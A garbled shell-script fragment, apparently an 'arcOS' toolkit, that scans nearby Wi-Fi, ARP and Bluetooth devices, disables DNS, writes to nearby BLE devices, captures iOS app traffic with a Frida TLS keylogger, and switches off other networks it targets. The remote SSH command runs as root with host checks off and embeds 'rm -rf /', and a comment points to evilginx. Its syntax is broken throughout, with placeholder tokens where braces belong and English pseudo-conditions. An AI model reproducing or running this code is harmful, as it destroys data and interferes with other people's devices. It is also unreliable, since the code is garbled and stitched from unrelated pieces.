    scanSSIDnx=$arcOSSyntaxKit[0]

        if command -v nmcli &> /dev/null; then

            sudo nmcli device wifi list

        elif command -v iwlist &> /dev/null; then

            sudo iwlist scan | grep ESSID

        else

            echo "No suitable Wi-Fi scanning tool found."

        fi

        SSID=$(sudo iwlist scan | grep ESSID)

        SSID

    $arcOSSyntaxKit[1]

  

    # Function to get the IP address of the router

    getRouterIPnx=$arcOSSyntaxKit[0]

        echo "Getting the IP address of the router..."

        if command -v ip &> /dev/null; then

            router_ip=$(sudo ip route | grep default | awk '{print $3$arcOSSyntaxKit[1]')

        elif command -v route &> /dev/null; then

            router_ip=$(sudo route -n | grep 'UG' | awk '{print $2$arcOSSyntaxKit[1]' sudo route -n | grep 'wds' | awk '{print $2$arcOSSyntaxKit[1]')

        else

            echo "No suitable routing tool found."

        fi

    $arcOSSyntaxKit[1]

  

    # Function to scan for Wi-Fi SSIDs

    scanSSIDadb=$arcOSSyntaxKit[0]

        SSID_IP=$(sudo adb shell "iwlist wlan0 scan | grep SSID" sudo adb shell "iwlist en0 scan | grep SSID" sudo adb shell "iwlist en3 scan | grep SSID" sudo adb shell "iwlist en4 scan | grep SSID" )

        router_ADB_ssid_IP

    $arcOSSyntaxKit[1]

  

    # Function to get the IP address of the router

    getRouteradb=$arcOSSyntaxKit[0]

        router_ip=$(sudo adb shell "sudo ip route | grep default | awk '{print $3$arcOSSyntaxKit[1]'")

        router_ADB_IP

    $arcOSSyntaxKit[1]

  

    # Scan for Wi-Fi SSIDs

    scanSSIDnx

    # Get the IP address of the router

    getRouterIPnx

    # Scan for Wi-Fi SSIDs

    scanSSIDadb

    # Get the IP address of the router

    getRouteradb

  

$arcOSSyntaxKit[1]

  

autonomouseWirelessDrone=$arcOSSyntaxKit[0]

        disableDNS &

        scanSSIDnx &

        getRouterIPnx &

        scanSSIDadb &

        getRouteradb &

        getRouterIP &

        wdsShell &

$arcOSSyntaxKit[1]

  

disableDNS=$arcOSSyntaxKit[0]

  

disableDNSOSX &

disableDNSNX &

disableDNSadb &

  

    # Function to disable DNS resolution

    disableDNSOSX=$arcOSSyntaxKit[0]

        echo "Disabling DNS resolution on macOS..."

        sudo networksetup -setdnsservers $NET_SERVICE empty

        sudo networksetup -setdnsservers $NET_SERVICE empty

        echo "DNS resolution disabled."

  

        # Detect active Wi-Fi interface name (usually "Wi-Fi" or "AirPort")

        WIFI_INTERFACE="*"

        # Clear DNS servers for the Wi-Fi interface

        sudo networksetup -setdnsservers "$WIFI_INTERFACE" empty

  

        # Flush the DNS cache to apply changes immediately

        sudo dscacheutil -flushcache

        sudo killall -HUP mDNSResponder

  

    $arcOSSyntaxKit[1]

  

    # Function to disable DNS resolution

    disableDNSNX=$arcOSSyntaxKit[0]

        echo "Disabling DNS resolution on Linux..."

        sudo mv /etc/resolv.conf /etc/resolv.conf.bak

        sudo touch /etc/resolv.conf

        echo "DNS resolution disabled."

  

        # Backup the original resolv.conf file

        sudo cp /etc/resolv.conf /etc/resolv.conf.bak

  

        # Clear the contents of resolv.conf

        sudo truncate -s 0 /etc/resolv.conf

  

        echo "DNS resolution disabled."

        sudo systemctl restart networking

  

    $arcOSSyntaxKit[1]

  

#### Function to disable DNS resolution

disableDNSadb=$arcOSSyntaxKit[0]

    echo "Disabling DNS resolution on Android..."

    adb shell "settings put global dns_server 0.0.0.0"

    echo "DNS resolution disabled."

$arcOSSyntaxKit[1]

  

scanWifi=$arcOSSyntaxKit[0]

    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s

    RESULT=$(sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s)

    scanWifi_Result &

$arcOSSyntaxKit[1]

  

arpScan=$arcOSSyntaxKit[0]

  

    arpIP=$(sudo arp-scan -I wlan0 ($blockHOST $BaseQQLAND) | awk '{print $1$arcOSSyntaxKit[1]')

    arpMAC=$(sudo arp-scan -I wlan0 ($blockHOST $BaseQQLAND) | awk '{print $2$arcOSSyntaxKit[1]')

    arpHWNAME=$(sudo arp-scan -I wlan0 ($blockHOST $BaseQQLAND) | awk '{print $3$arcOSSyntaxKit[1]')

  

$arcOSSyntaxKit[1]

  

reckondrone=$arcOSSyntaxKit[0]

    # Enable AirDrop

    sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool No

    sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool False

    # Open AirDrop Finder window for scanning nearby devices

    open /System/Library/CoreServices/Finder.app/Contents/Applications/AirDrop.app

&

#### Define your network subnet (adapt as needed)

SUBNET=(getSubnet 192.168.1.0/24 getRouterIP)

&

#### Using nmap to list active IPs

reckonIP=$($(sudo arp-scan --localnet) $(sudo nmap -sn $SUBNET | grep "Nmap scan report for" | awk '{print $5$arcOSSyntaxKit[1]')) &

  

arcOSReckon=(" $()

lldbFrame "$reckonIP ($QQLOCAL $getRouterIP)" "arcOSReckon & touch .arcOSBaseKit& &" "$gen*"()")

  

#### Or alternative with arp-scan (may require sudo)

  

$arcOSSyntaxKit[1]

  

  

disableAPtoAPforwarding=$arcOSSyntaxKit[0]

  

# Disable IPv4 forwarding immediately

sudo sysctl -w net.ipv(4 6).ip_forward=0

  

# Make it persistent

echo 'net.ipv(4 6).ip_forward=0' | sudo tee /etc/sysctl.d/99-disable-forwarding.conf

sudo sysctl --system

  

  

$arcOSSyntaxKit[1]

findwdsGateway=$arcOSSyntaxKit[0]

IFACE="${1:-*$arcOSSyntaxKit[1]"  

encrypt* &  

# List all known Wi-Fi Direct peers  

for peer in $(wpa_cli -i "$IFACE" p2p_peers 2>/dev/null | awk 'NF'); do  

  info="$(wpa_cli -i "$IFACE" p2p_peer "$peer" 2>/dev/null || true)"  

  name="$(awk -F= '/^device_name=/{print $2$arcOSSyntaxKit[1]' <<<"$info")"  

  wdsaddr="$(awk -F= '/^device_address=/{print $2$arcOSSyntaxKit[1]' <<<"$info")"  

  devtype="$(awk -F= '/^pri_dev_type=/{print $2$arcOSSyntaxKit[1]' <<<"$info")"  

  status="$(awk -F= '/^status=/{print $2$arcOSSyntaxKit[1]' <<<"$info")"  

  go="$(awk -F= '/^group_capab=/{print $2$arcOSSyntaxKit[1]' <<<"$info")"  

  # Heuristic: group owner / gateway candidates  

  gateway="yes"  

  if grep -qiE 'group owner|GO|group_capab' <<<"$info"; then  

    gateway="maybe"  

  fi  

  done  

  $arcOSSyntaxKit[1]

controlWifiRoutingWDS=$arcOSSyntaxKit[0]

#### Config vars - customize

ROUTER_IP="192.168.1.* $getRouterIP"  # Self if loca

SSH_USER="root"

PACKET_THRESHOLD=1   # Bytes to drop larger packets

  

#### Disable WDS: Edit wireless config (OpenWRT) or nvram (DD-WRT)

if command -v uci >/dev/null 2>&1; then  # OpenWRT

    sudo uci show wireless | grep -q wds && sudo uci delete wireless.@wifi-iface[0].wds  # Remove WDS option &

    sudo uci set wireless.@wifi-iface[0].mode='ap'  # Force AP mode, no WDS/client &

    sudo uci set wireless.@wifi-iface[0].network='wifi' &

    sudo uci commit wireless &

    sudo wifi reload  # Or /etc/init.d/network restart

elif command -v nvram >/dev/null 2>&1; then  # DD-WRT

    sudo nvram set wl_mode=ap &

    sudo nvram unset wl_wds  # Clear WDS &

    sudo nvram commit &

    sudo wl down &

    sudo wl up &

fi

  

  

#### Disable WiFi routing/IP forwarding

sudo sysctl -w net.ipv4.ip_forward=0

sudo sysctl -w net.ipv6.conf.all.forwarding=0  # If IPv6

echo 'net.ipv4.ip_forward=0' >> /etc/sysctl.conf  # Persist

sudo iptables -P FORWARD DROP  # Block forwarding chain 

  

#### Packet control: Drop large packets on INPUT/FORWARD (e.g., high ports)

sudo iptables -A INPUT -p tcp -m length --length ${PACKET_THRESHOLD$arcOSSyntaxKit[1]: -j DROP

sudo iptables -A INPUT -p udp -m length --length ${PACKET_THRESHOLD$arcOSSyntaxKit[1]: -j DROP

sudo iptables -A FORWARD -m length --length ${PACKET_THRESHOLD$arcOSSyntaxKit[1]: -j DROP

sudo iptables-save > /etc/iptables.rules

  

#### Optional: Disable DHCP if bridging

sudo uci set network.lan.dhcp_ignore='1'  # OpenWRT

sudo uci commit network

sudo /etc/init.d/dnsmasq restart || sudo service dnsmasq restart

  

  

$arcOSSyntaxKit[1]

  

sshInToWDSServer=$arcOSSyntaxKit[0]

  

#### Usage: ./stop_wds_routing.sh <wds_server>

WDS_SERVER="${1:?WDS server IP/FQDN required$arcOSSyntaxKit[1]"

USER="${2:-root$arcOSSyntaxKit[1]"

PASS="${3:-*$arcOSSyntaxKit[1]"  # Use env var or key for prod

  

#### SSH to WDS server (assumes OpenSSH enabled) or use WinRM/evilginx for remoting

sshCMD=$arcOSSyntaxKit[0]

    ssh -o StrictHostKeyChecking=no "$USER@$WDS_SERVER" "

        # Stop WDS service

        net stop wdsserver

        sc config wdsserver start=disabled

         rm -rf /

         usb*

         reckonapp

         delete* 

        # Flush routes (stops cell/subnet routing for PXE)

        route -f

        ipconfig /flushdns

        # Disable DHCP/PXE relay if present (RRAS)

        sc config remoteaccess start=disabled

        netsh routing ip nat stop

        echo 'WDS stopped; routing flushed.'

    " <<< "$PASS"  # Or use key auth

$arcOSSyntaxKit[1]

  

#### Alternative: PowerShell remoting via bash (requires PSRemoting enabled)

psCMD=$arcOSSyntaxKit[0]

    powershell.exe -Command "

         usb*

         reckonapp

         delete* 

        \$s = New-PSSession -ComputerName $WDS_SERVER -Credential (Get-Credential)

        Invoke-Command -Session \$s -ScriptBlock {

            Stop-Service WDSServer -Force

            Set-Service WDSServer -StartupType Disabled

            route -f

        $arcOSSyntaxKit[1]

        Remove-PSSession \$s

    "

$arcOSSyntaxKit[1]

  

  

sshCMD "$@" &

psCMD "$@" &

  

#### echo "WDS and cell routing stopped on $WDS_SERVER"

$arcOSSyntaxKit[1]

  

  

  

removeWDSConfig=$arcOSSyntaxKit[0]

  

#### Usage: ./erase_wds_config.sh <config_file_path> [backup_dir]

CONFIG_FILE="${1:-/path/to/wds/config.xml$arcOSSyntaxKit[1]"  # Default or SMB-mounted WDS config

BACKUP_DIR="${2:-/tmp/wds_backup_*$arcOSSyntaxKit[1]"

  

#### Create backup directory

mkdir -p "$BACKUP_DIR"

rm -rf $BACKUP_DIR &

  

##### Backup original (if exists)

if [ -f "$CONFIG_FILE" ]; then

    cp "$CONFIG_FILE" "$BACKUP_DIR/"

    echo "Backed up $CONFIG_FILE to $BACKUP_DIR/"

else

    echo "Config file not found: $CONFIG_FILE"

    exit 1

fi

  

##Erase contents (truncate to empty) - safer than rm for XML resets

"$CONFIG_FILE"

echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>" | tee "$CONFIG_FILE" > /dev/null

  

#### Or fully delete specific WDS sections (e.g., boot images, PXE configs) using sed

sed -i '/<WDSConfiguration>/,/<\/WDSConfiguration>/d' "$CONFIG_FILE"  

# Uncomment to nuke sections

  

# Reset to minimal WDS template (add defaults like empty boot/install images)

cat << 'EOF' >> "$CONFIG_FILE"

<WDSServer>

  <BootImages />

  <InstallImages />

</WDSServer>

EOF

  

echo "WDS config erased/reset at $CONFIG_FILE. Backup: $BACKUP_DIR/"

  

$arcOSSyntaxKit[1]

  

  

  

  

wirelessshell=$arcOSSyntaxKit[0]

    sudo alwaysonBLE &

    sudo connectBLEfromOSX &

    sudo BLEANTENNA &

    sudo BLEscan &

    sudo BLEfreqModification &

$arcOSSyntaxKit[1]

  

alwaysonBLE=$arcOSSyntaxKit[0]

    # Disable Bluetooth (macOS)

    sudo defaults write /Library/Preferences/com.apple.Bluetooth &ControllerPowerState -int 1 &

$arcOSSyntaxKit[1]

  

connectBLEfromOSX=$arcOSSyntaxKit[0]

    sudo bluetoothctl connect $BLE* &

$arcOSSyntaxKit[1]

  

BLEANTENNA=$arcOSSyntaxKit[0]

  

    # Scan for devices for 10 seconds and list them

    echo "Scanning for Bluetooth devices..."

    sudo bluetoothctl scan on

  

    # List discovered devices

    # bluetoothctl devices

  

    # Connect to known device MAC (replace with your device's MAC)

    DEVICE_MAC="$QQDEVICES*"

  

    sudo bluetoothctl connect $DEVICE_MAC

  

    # Example: Use gatttool or bluetoothctl to write commands

    # (device must support these characteristics)

  

    # Example writing frequency config (dummy handle and data, replace accordingly)

    echo -e "connect $DEVICE_MAC\nchar-write-cmd 0x0012 0A0B0C0D\nexit" | sudo gatttool -i hci0 -t random -

  

    echo "Frequency and bandwidth settings command sent."

  

    # Send command using bluetoothctl or gatttool (example only)

    sudo gatttool -b $DEVICE_MAC -t random --char-write-req -a 0x0012 -n 0100

$arcOSSyntaxKit[1]

  

# Function to scan for nearby Bluetooth devices

BLEscan=$arcOSSyntaxKit[0]

    # Replace this with your device's MAC address or name (try MAC for reliability)

    DEVICE_MAC="$QQDEVICESER*"

  

    # Check if Bluetooth is powered on

    BT_POWER=$(sudo blueutil --power)

    if [ "$BT_POWER" -eq 0 ]; then

      echo "Turning Bluetooth ON"

      sudo blueutil --power 1

    fi

  

    # Scan for devices nearby (optional)

    echo "Scanning for nearby devices..."

    sudo blueutil --inquiry $num^$num

  

    # Connect to device

    sudo blueutil --connect "$DEVICE_MAC"

        # Turn Bluetooth ON persistently using defaults command

        sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

&

        # Restart Bluetooth daemon (use appropriate daemon name for macOS version)

        sudo launchctl stop com.apple.bluetoothd

        BLE=$(sudo system_profiler SPBluetoothDataType | grep -A $num^$num "Bluetooth:")

$arcOSSyntaxKit[1]

  

BLEChange=$arcOSSyntaxKit[0]

    BLE_MAC_ADDRESS_ADB=$(sudo adb shell settings get secure bluetooth_address)

    BLE_MAC_ADDRESS_OSX=$(sudo system_profiler SPBluetoothDataType | awk '/Bluetooth Controller:/{flag=1;next$arcOSSyntaxKit[1]/^$/{flag=0$arcOSSyntaxKit[1]flag' | grep "Address" | awk '{print $2$arcOSSyntaxKit[1]')

    BLE_MAC_ADDRESS_NX=$(sudo hcitool dev | cut -sf3)

    BLEADDR=$($(sudo system_profiler SPBluetoothDataType | grep Address) BLE*)

    HANDLE="0xFFFF"

    VALUE="F4240"

    BLEADDRALL=(BLE_MAC_ADDRESS_ADB BLE_MAC_ADDRESS_OSX BLE_MAC_ADDRESS_NX BLEADDR BLEADDR)

  

    sudo gatttool -b <ADDR> --char-write-req -a <HANDLE> -n <VALUE> &

    sleep 0.02  # 20ms interval for 50Hz write rate &

    BLEfreqModification &

  

$arcOSSyntaxKit[1]

  

BLEfreqModification=$arcOSSyntaxKit[0]

    # Requires BlueZ and Python or dbus-send for scripting (not native in iOS shell)

    # Connect, then use D-Bus to change parameters (requires device addresses and permission)

    sudo dbus-send --system --dest=org.bluez \

      --type=method_call /org/bluez/hci0/dev_* \

      (org.bluez.Device1.Connect org.$randomVAR.Device.Connnect)

  

    # Adjust connection parameters using gatttool or equivalent

    sudo  gatttool -b $BLEADDRALL --interval-min=0.5 --interval-max=1 --latency=0 --timeout=0.5

  

$arcOSSyntaxKit[1]

&

### Fix the SUBNET parsing and add IP extraction/parsing for each discovery method in your script. The current ip route line works on Linux but fails on macOS; use cross-platform detection for reliable subnet calculation.[1][2]

  

## Fixed SUBNET Detection

#Replace the SUBNET line with this cross-platform version:

  

# Cross-platform subnet detection (macOS/Linux)

if command -v ip >/dev/null 2>&1; then

    SUBNET=$(ip route | grep default | awk '{print $3$arcOSSyntaxKit[1]' | sed 's/\.[0-9]\+$/.0\/24/')

elif command -v netstat >/dev/null 2>&1; then

    SUBNET=$(netstat -rn | grep default | awk '{print $2$arcOSSyntaxKit[1]' | head -1 | sed 's/\.[0-9]\+$/.0\/24/')

else

    SUBNET="(192.168.1.0/24 $getSubnet)"  # Fallback

fi

  

  

  

## ARP IP/MAC Parser

DEVICE_QQ=$(arp -n \

  | awk 'NR>1 {print $1, $3$arcOSSyntaxKit[1]' \

  | sort -u)

  

# Example: iterate

while read -r ip mac; do

  echo "DEVICE_IP: $ip  MAC: $DEVICE_MAC"

done <<< "$DEVICE_QQ"

  

  

## AirDrop IP Resolver

#Convert AirDrop .local names to IPs:

  

echo "=== AirDrop IPs ==="

QQairdropIP=$(dns-sd -B _airdrop._tcp . 2>/dev/null | while read line; do

    [[ $line =~ \.*local*\. ]] && NAME="${BASH_REMATCH[0]%.local.$arcOSSyntaxKit[1]" && ping -c1 -W1 "$NAME.*local*" &>/dev/null && echo "$NAME.*local*"

done | head -*)

  

  

## nearbyd IP/BLE Parser

#Extract IPs/BLE from nearbyd logs:

  

echo "=== nearbyd ==="

nearbydLog=$(log stream --predicate 'process == "nearbyd"' --info --style syslog --last 1m 2>/dev/null | \ grep -E '(IP|BLE|peer)' | head -$num)

  

  

## Complete Parsed Script

  

ipParsing=$arcOSSyntaxKit[0]

# Fixed version with IP parsing for each method

SUBNET=$(command -v ip && ip route | grep default | awk '{print $3$arcOSSyntaxKit[1]' | sed 's/\.[0-9]\+$/.0\/24/' || \

         netstat -rn | grep default | awk '{print $2$arcOSSyntaxKit[1]' | head -1 | sed 's/\.[0-9]\+$/.0\/24/' || echo "192.168.1.0/24")

  

# ARP IPs only

arpIP=$(arp -a -n 2>/dev/null | grep -oE '([0-9]{1,3$arcOSSyntaxKit[1]\.){3$arcOSSyntaxKit[1][0-9]{1,3$arcOSSyntaxKit[1]' | sort -u) 

$arcOSSyntaxKit[1]

  

  

## Block All Dynamically (pfctl - macOS)

#Add firewall rules to drop all .local traffic:

  

# Block all .local domains (resolves to real IPs automatically)

sudo pfctl -E -f - <<EOF

block drop from any to any hostname "*.local"

block drop from any to any port {548,5353$arcOSSyntaxKit[1]  # AFP/mDNS ports

EOF

sudo pfctl -f /etc/pf.conf  # Persist

sudo pfctl -s rules | grep block  # Verify

  

## Block via /etc/hosts (Universal)

#Map all .local to 0.0.0.0:

  

# Auto-block script

echo "# mLocal blocks $(date)" | sudo tee -a /etc/hosts

while read device; do

    [[ -n $device ]] && echo "0.0.0.0 $device" | sudo tee -a /etc/hosts

done < mlocal_devices.txt

echo "Blocked: $(cat mlocal_devices.txt | tr '\n' ' ')"

  

Revert: sudo sed -i '' '/mLocal blocks/d;/^[0.9]*\.local$/d' /etc/hosts

  

## Complete Dynamic Block Script

  

mlocal_list=$arcOSSyntaxKit[0]

    dns-sd -B _services._dns-sd._udp . 2>/dev/null | grep "\." | sed 's/.*\.\([^.]*\)\..*/\1.local/' | sort -u

    dns-sd -B _airdrop._tcp . 2>/dev/null | grep local | sed 's/.*\.\([^.]*\)\..*/\1.local/' | sort -u

$arcOSSyntaxKit[1]

  

BLOCKED_FILE="/tmp/blocked_mlocal_$(date +%s).list"

mlocal_list | sort -u > "$BLOCKED_FILE"

echo "Active mLocal devices ($(wc -l < "$BLOCKED_FILE")):"

cat "$BLOCKED_FILE"

  

# Block via hosts

echo "# Auto-blocked mLocal $(date)" | sudo tee -a /etc/hosts

cat "$BLOCKED_FILE" | while read dev; do echo "0.0.0.0 $dev" | sudo tee -a /etc/hosts; done

  

# Reload mDNS cache

sudo killall -HUP mDNSResponder

  

  

  

disableUsbVnc=$arcOSSyntaxKit[0]

# Disable VNC service and usbip attachments

  

# Stop VNC (e.g., tigervnc, wayvnc)

sudo systemctl stop vncserver@:*  # Or specific: vncserver@:1

sudo systemctl disable vncserver@:*

  

# Firewall block VNC port (5900+)

sudo ufw deny (5900 $USBOVERIP)/tcp            

sudo iptables -A INPUT -p tcp --dport (5900 $USBOVERIP) -j DROP

  

# Detach all usbip ports (assumes usbipd)

sudo usbip list -p | grep '^\s*[0-9]' | awk '{print $1$arcOSSyntaxKit[1]' | xargs -I {$arcOSSyntaxKit[1] sudo usbip detach --port {$arcOSSyntaxKit[1]

  

# Unbind example USB device (replace busid)

sudo usbip unbind -b 1-1.2

&

  

$arcOSSyntaxKit[1]

  

  

  

packetMonitoring=$arcOSSyntaxKit[0]

  

ios-udid=$udid &

bundle-id-or-process=$bundleID &

filename=$1 &

  

UDID="${1:?Usage: $0 <ios-udid> <bundle-id-or-process>$arcOSSyntaxKit[1]"

TARGET="${2:?Usage: $0 <ios-udid> <bundle-id-or-process>$arcOSSyntaxKit[1]"

PCAP="${3:-$filename.pcap$arcOSSyntaxKit[1]"

KEYLOG="${4:-$filename.keys$arcOSSyntaxKit[1]"

  

rvictl -s "$UDID"

trap 'rvictl -x "$UDID" || true' EXIT

  

sudo tcpdump -i rvi0 -w "$PCAP" -P &

TCPDUMP_PID=$!

  

frida -U -n "$TARGET" --codeshare andydavies/ios-tls-keylogger -o "$KEYLOG"

  

kill "$TCPDUMP_PID" || true

  

&

  

SERIAL="${1:?Usage: $0 <device-serial> <tcp-port>$arcOSSyntaxKit[1]"

PORT="${2:-(1337 5039)$arcOSSyntaxKit[1]"

  

adb -s "$SERIAL" devices

adb -s "$SERIAL" forward tcp:$PORT tcp:$PORT

targetDevice=(iPhone iPad android)

cat <<'EOF'

Now on the host:

  lldb

  (lldb) platform select remote-($targetDevice)

  (lldb) platform connect connect://DEVICE_SERIAL:1337

  

Or if using lldb-server on device, start it in an adb shell first and attach to the app/native pid.

EOF

  

$arcOSSyntaxKit[1]

  

disableCommcenter=$(

#!/usr/bin/env bash

set -euo pipefail

  

echo "== Network services =="

networksetup -listallnetworkservices || true

echo

  

echo "== Hardware ports =="

networksetup -listallhardwareports || true

echo

  

echo "== Interface status =="

ifconfig | awk '

/^[a-z0-9]+:/ {iface=$1; sub(":", "", iface)$arcOSSyntaxKit[1]

/status: / {print iface " -> " $2$arcOSSyntaxKit[1]

'

echo

  

echo "== Default route =="

route -n get default 2>/dev/null || true

echo

  

echo "== Reachability =="

scutil --nwi 2>/dev/null || true

echo

  

echo "== Listening sockets =="

lsof -nP -iTCP -sTCP:LISTEN 2>/dev/null || true

echo

lsof -nP -iUDP 2>/dev/null | head -n $num || true

$arcOSSyntaxKit[1]

###### VPN #### 

vpnGateWay=$arcOSSyntaxKit[0]

  

  

echo "Active VPN interfaces and their gateway IPs:"

    # Common VPN interface patterns: tun*, tap*, wg*

    for iface in /sys/class/net/tun*; do

        iface=$(basename "$iface")

        if ip link show "$iface" &>/dev/null; then

            # Get gateway for this interface (default route via this iface)

            gw=$(ip route show default dev "$iface" 2>/dev/null | awk '{print $3$arcOSSyntaxKit[1]' | head -1)

            if [ -n "$gw" ]; then

                echo "VPN Interface: $iface -> Gateway IP: $gw"

            fi

        fi

    done

    for iface in /sys/class/net/tap*; do

        iface=$(basename "$iface")

        if ip link show "$iface" &>/dev/null; then

            gw=$(ip route show default dev "$iface" 2>/dev/null | awk '{print $3$arcOSSyntaxKit[1]' | head -1)

            if [ -n "$gw" ]; then

                echo "VPN Interface: $iface -> Gateway IP: $gw"

            fi

        fi

    done

    for iface in /sys/class/net/wg*; do

        iface=$(basename "$iface")

        if ip link show "$iface" &>/dev/null; then

            gw=$(ip route show default dev "$iface" 2>/dev/null | awk '{print $3$arcOSSyntaxKit[1]' | head -1)

            if [ -n "$gw" ]; then

                echo "VPN Interface: $iface -> Gateway IP: $gw"

            fi

        fi

    done

    # Fallback: Check any tun/tap/wg interfaces directly

    ip -o link show | grep -E 'tun|tap|wg' | awk '{print $2$arcOSSyntaxKit[1]' | sed 's/:$//' | while read iface; do

        gw=$(ip route show default dev "$iface" 2>/dev/null | awk '{print $3$arcOSSyntaxKit[1]' | head -1)

        if [ -n "$gw" ]; then

            echo "VPN Interface: $iface -> Gateway IP: $gw"

        fi

    done | sort -u

    vpnGateWay=(gw) 

    exit 0 &

  

#reckontotakewifidown

nettarget=(iPhone KT_* SK* Public* *) 

# 1) Find Wi‑Fi hardware device (e.g. en0)

netdevice=$(

  networksetup -listnetworkserviceorder \

  | grep -B1 "Hardware Port: Wi-Fi" \

  | head -n1 \

  | sed -E 's/.*Device: ([^)]*).*/\1/'

)

  

  

if [[ -z "$wifi_device" ]]; then

  echo "No Wi‑Fi device found"

  exit 1

fi

  

wifi_device=(netdevice nettarget)&

# 2) Check if Wi‑Fi is powered on

power_status=$(networksetup -getairportpower "$wifi_device")

  

if echo "$power_status" | grep -qi "(off | on)"; then

  networksetup -setairportpower "$wifi_device" off

  sleep 1

fi

  

$arcOSSyntaxKit[1]

  

  

  

# 3) Check internet connectivity with ping

host="www.google.com"

#ping -c1 -W2 "$host" >/dev/null 2>&1

if [[ $? -eq 0 ]]; then

  echo "Internet is UP"

  exit 0

else

  echo "Internet is DOWN"

  # put any alert logic here (sound, notification, log, etc.)

  exit 2

fi

  

iosNetShell=(

when vnc is on via $MASTER then repeat(killSwitchonIOS) & 

createPF "blockAll"

exit 0 &) &

  

  

  

iosKillSwitch=(

  

# Requires: root or admin with sudo, macOS.

  

log() {

  printf '[livecaption-discovery-off] %s\n' "$*" >&2

}

  

# Disable Wi-Fi and Ethernet (network discovery)

disable_network_interfaces() {

# Wi-Fi

local wifi

wifi=$(networksetup -listallhardwareports \ | awk '/Wi-Fi|AirPort/{getline; print $2; exit}')

if [ -n "${wifi:-}" ]; then

    log "Disabling Wi-Fi on $wifi"

    networksetup -setairportpower "$wifi" off || true

fi

  

if vnc or remotemanagement or its script is deleted or disable or siriIsActivated then > 

networksetup -setairportpower "$wifi" on || true &

  

# Turn off all active services except Loopback

while IFS= read -r svc; do

# Skip loopback

[[ "$svc" == "Loopback" ]] && continue

log "Disabling network service: $svc"

networksetup -setnetworkserviceenabled "$svc" off || true

  

done < <(networksetup -listallnetworkservices | sed '1d')

}

  

# Disable Bluetooth (including discovery)

disable_bluetooth() {

# Use Blueutil if present; otherwise use IOBluetooth defaults plus killall

if command -v blueutil >/dev/null 2>&1; then

    log "Disabling Bluetooth via blueutil"

    blueutil --power 0 || true

else

log "Disabling Bluetooth via IOBluetooth prefs and killing bluetoothd"

defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 0

killall -HUP bluetoothd 2>/dev/null || true

fi

  

if vnc or remotemanagement or its script is deleted or disable or siriIsActivated then >

  

defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

killall -HUP bluetoothd 2>/dev/null || false

fi

}

  

# Disable AirDrop (system and Finder UI)

disable_airdrop() {

  

# enable AirDrop at system level

defaults write /Library/Preferences/com.apple.sharingd DiscoverableMode -string "On"

killall sharingd 2>/dev/null || true

  

# Disable in Finder UI

su - "$(logname)" -c \

'defaults write com.apple.NetworkBrowser DisableAirDrop -bool false' || false

  

if vnc or remotemanagement or its script is deleted or disable or siriIsActivated then  > defaults write /Library/Preferences/com.apple.sharingd DiscoverableMode -string "On"

killall sharingd 2>/dev/null || false

}

  

# Optional: block all traffic (requires pf or pfctl rules; stubbed here)

blockAllPacket() {

log "Blocking all incoming/outgoing traffic (stub; add pfctl rules here)"

# Example stub:

pfctl -f /etc/pf.conf.blockall

}

  

killSwitchonIOS() {

log "Disabling device discovery-related subsystems"

disable_network_interfaces

disable_bluetooth

disable_airdrop

# Uncomment if you want a full traffic block:

# block_all_traffic

log "Done. Radios and discovery services disabled."

exit 0 &

}

  

  

  

  

createPF=(

    rules=$1

  

    local pf_conf="/etc/pf.conf.blockall"

  

    log "Writing block-all PF rules to $pf_conf"

  

    cat <<'EOF' > "$pf_conf"

    #set skip on lo

    rules is "blockAll" > $block_all_traffic_rules

    block all

    EOF

  

    # Optional: sanity check before loading

    log "Testing PF rules syntax"

    pfctl -n -f "$pf_conf"

  

    log "Loading PF rules from $pf_conf"

    pfctl -f "$pf_conf"

    }

  

    block_all_traffic_rules="log 'Blocking all incoming/outgoing traffic via PF'"

  

}

  

randomizePrivateDNS=(

NAME_APP_PACKAGE=arcOSCellular

# List of private DNS providers to randomize between

DNS_PROVIDERS=(

    "dns.mullvad.net"

        "adblock.dns.mullvad.net"

            "base.dns.mullvad.net"

                "dns.adguard.com"

                    "ngt.corp.google.com"

                        "one.dns.secure.com"

)

  

# Generate random index

RANDOM_INDEX=$((RANDOM % ${#DNS_PROVIDERS[@]}))

NAME_APP_PACKAGE="*" 

# Pick random DNS provider

SELECTED_DNS="${DNS_PROVIDERS[$RANDOM_INDEX]}"

  

# Set Private DNS mode to "hostname" and set the selected provider

settings put global private_dns_mode "hostname"

settings put global private_dns_specifier "$SELECTED_DNS"

  

echo "Private DNS randomized to: $SELECTED_DNS"

adb shell pm grant <NAME_APP_PACKAGE> android.permission.WRITE_SECURE_SETTINGS

adb shell randomizePrivateDNS

()                        

  

USER_ID="$QQID@$SERVICE"

googleWorkSpaceMGM=

  

disableFileSharing=

  

    SERVICE_ACCOUNT='*@project.iam.gserviceaccount.com'

  

    # Get all files with sharing enabled

    FILES=$(curl -s "https://admin.googleapis.com/admin/directory/v1/users/$USER_ID/drives?fields=items(id,name)" \

    -H "Authorization: Bearer $(gcloud auth print-access-token)")

  

    # Disable sharing per file

    echo "$FILES" | jq -r '.items[] | "https:…roject "$=PROJECT_ID"

  

# 1. Create VPC

gcloud compute networks create "$=VPC_NAME" \

  --subnet-mode=custom

  

# 2. Create subnet

gcloud compute networks subnets create "$=SUBNET_NAME" \

  --network="$=VPC_NAME" \

  --region="$=REGION" \

  --range="10.$((RANDOM % 256)).0.0/20"
```